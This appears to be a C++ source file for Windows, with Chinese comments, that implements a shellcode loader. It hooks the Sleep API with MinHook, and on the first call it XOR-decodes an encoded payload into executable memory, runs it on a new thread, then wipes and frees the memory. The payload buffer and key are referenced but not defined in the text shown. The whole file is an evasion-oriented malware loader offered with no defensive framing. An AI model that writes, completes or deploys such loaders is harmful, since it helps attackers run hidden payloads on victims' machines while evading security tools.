#include <Windows.h>
#include "MinHook.h"

#if defined _M_X64
#pragma comment(lib, "MinHook.x64.lib")
#elif defined _M_IX86
#pragma comment(lib, "MinHook.x86.lib")
#endif

// ── 原始 Sleep 原型
using Sleep_t = VOID(WINAPI*)(DWORD);
Sleep_t fpSleep = nullptr;

// ── Hook 函数
VOID WINAPI MyHookSleep(DWORD ms)
{
    static bool done = false;
    if (!done)
    {
        done = true;

        LPVOID mem = VirtualAlloc(nullptr, shellcode_len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
        if (mem)
        {
            memcpy(mem, encoded_shellcode, shellcode_len);
            for (size_t i = 0; i < shellcode_len; ++i)
                ((unsigned char*)mem)[i] ^= xor_key[i % key_len];

            HANDLE h = CreateThread(nullptr, 0,
                reinterpret_cast<LPTHREAD_START_ROUTINE>(mem),
                nullptr, 0, nullptr);
            if (h) { WaitForSingleObject(h, INFINITE); CloseHandle(h); }

            SecureZeroMemory(mem, shellcode_len);
            VirtualFree(mem, 0, MEM_RELEASE);
        }
    }

    // 继续原始 Sleep
    fpSleep(ms);
}


int main()
{
    // 1) 初始化 MinHook
    if (MH_Initialize() != MH_OK) { return 1; }

    // 2) 更安全的做法：用“官方” API 名称创建 Hook
    if (MH_CreateHookApi(L"kernel32", "Sleep",
        &MyHookSleep,
        reinterpret_cast<LPVOID*>(&fpSleep)) != MH_OK)
    {
        return 1;
    }
    MH_EnableHook(MH_ALL_HOOKS);

    // 3) 触发
    Sleep(1000);    // 第一次调用 → 解密并运行载荷
    Sleep(500);     // 后续不再触发

    MH_Uninitialize();

    return 0;
}